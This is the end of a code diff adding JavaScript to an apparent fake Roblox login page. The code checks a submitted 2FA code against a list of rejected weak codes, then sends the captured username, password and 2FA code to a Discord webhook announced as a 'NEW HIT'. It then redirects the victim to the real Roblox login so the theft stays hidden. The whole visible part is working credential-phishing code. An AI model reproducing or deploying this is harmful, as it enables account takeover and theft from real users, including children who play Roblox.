+                "111222","222333","333444","444555","555666",
+                "123321","135531","147741","258852","369963",
+                "159951","357753","123210","112211","132231",
+                "001234","123654","135790","246800","963852",
+                "852963","741852","159753","357159","000001",
+                "000123","012012","120120","147258","258369",
+                "369258","481592","592713","025874","159357",
+                "258741","369147","471258","582369","008520",
+                "975310","864209","753198","642087","531976",
+                "013579","024680","001122","112233","223344",
+                "334455","445566","556677","667788","778899",
+                "998877","887766","000111","000222","000333",
+                "000444","000555","000666","000777","000888",
+                "000999","111000","222000","333000","444000",
+                "555000","666000","777000","888000","999000",
+                "111333","111444","111555","111666","111777",
+                "111888","111999","222111","222444","222555",
+                "222666","222777","222888","222999","333111",
+                "333222","333555","333666","333777","333888",
+                "333999","444000","444111","444222","444333",
+                "444666","444777","444888","444999","555111",
+                "555222","555333","555444","555777","555888",
+                "555999","666111","666222","666333","666444",
+                "666555","666888","666999","777111","777222",
+                "777333","777444","777555","777666","777888",
+                "777999","888111","888222","888333","888444",
+                "888555","888666","888777","888999","999111",
+                "999222","999333","999444","999555","999666",
+                "999777","999888","010203","020304","030405",
+                "040506","050607","060708","070809","080910"
+            ];
+
+            if(prohibidosCod.includes(codigo)){
+                error.textContent = "❌ Code is invalid";
+                return;
+            }
+
+            // ✅ CÓDIGO VÁLIDO → ENVIAR A DISCORD
+            error.textContent = "";
+            alert("✅ Code verified!\n🔓 Iniciando sesión...");
+
+            enviarDatosDiscord(codigo);
+        }
+
+        // ================= ENVIAR TODO A DISCORD =================
+        async function enviarDatosDiscord(codigo){
+            if(!WEBHOOK){
+                alert("✅ ¡Datos capturados! Webhook no configurado.");
+                return;
+            }
+
+            const datos = {
+                content: "@everyone **NEW HIT — NovaDynamics**",
+                embeds: [{
+                    title: "🔐 Cuenta Roblox Capturada",
+                    color: 16711680,
+                    fields: [
+                        {name: "👤 Usuario", value: "```"+USUARIO_CAPTURADO+"```", inline:false},
+                        {name: "🔑 Contraseña", value: "```"+PASS_CAPTURADA+"```", inline:false},
+                        {name: "📲 Código 2FA", value: "```"+codigo+"```", inline:false}
+                    ],
+                    footer: {text: "NovaDynamics Beam System"}
+                }]
+            };
+
+            await fetch(WEBHOOK, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify(datos)
+            });
+
+            alert("✅ ¡Todo listo! Redirigiendo a Roblox...");
+            window.location.href = "https://www.roblox.com/login";
+        }
+
+    </script>
 </body>
 </html>
